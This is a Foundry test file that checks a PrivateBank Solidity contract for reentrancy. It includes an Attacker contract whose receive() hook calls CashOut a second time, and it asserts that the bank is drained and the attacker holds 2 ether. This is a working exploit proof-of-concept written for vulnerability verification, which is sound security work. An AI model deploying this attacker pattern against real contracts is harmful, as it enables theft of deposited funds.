// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

contract PrivateBankTest is Test {
    PrivateBank private bank;
    Log private logContract;
    address private user1 = makeAddr("user1");
    Attacker private attacker;

    function setUp() public {
        // Deploy Log contract
        logContract = new Log();
        // Deploy PrivateBank with Log address
        bank = new PrivateBank(address(logContract));

        // Fund user1 and deposit into bank
        deal(user1, 1 ether);
        vm.prank(user1);
        bank.Deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        // Deploy attacker contract with 1 ether
        attacker = new Attacker{value: 1 ether}(bank);
        
        // Deposit attacker's funds into bank
        attacker.deposit();
        
        // Record state BEFORE attack
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Bank balance:", bankBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Execute the reentrancy attack
        attacker.attack();
        
        // Record state AFTER attack
        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Bank balance:", bankBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        
        // Differential verification
        bool exploited = (bankBalanceAfter == 0) && 
                         (attackerBalanceAfter == 2 ether);
        
        if (exploited) {
            console.log("Vulnerability Exists: Bank was drained and attacker gained funds via reentrancy");
        } else {
            console.log("Vulnerability not Exist: No reentrancy effect observed");
        }
        
        // Also keep the original assertions
        assertEq(bankBalanceAfter, 0, "Bank not drained");
        assertEq(attackerBalanceAfter, 2 ether, "Attacker didn't steal funds");
    }
}

contract Attacker {
    PrivateBank public immutable target;
    uint256 private count;

    constructor(PrivateBank _target) payable {
        target = _target;
    }

    function deposit() public {
        target.Deposit{value: 1 ether}();
    }

    function attack() public {
        target.CashOut(1 ether);
    }

    receive() external payable {
        if (count == 0) {
            count++;
            target.CashOut(1 ether);
        }
    }
}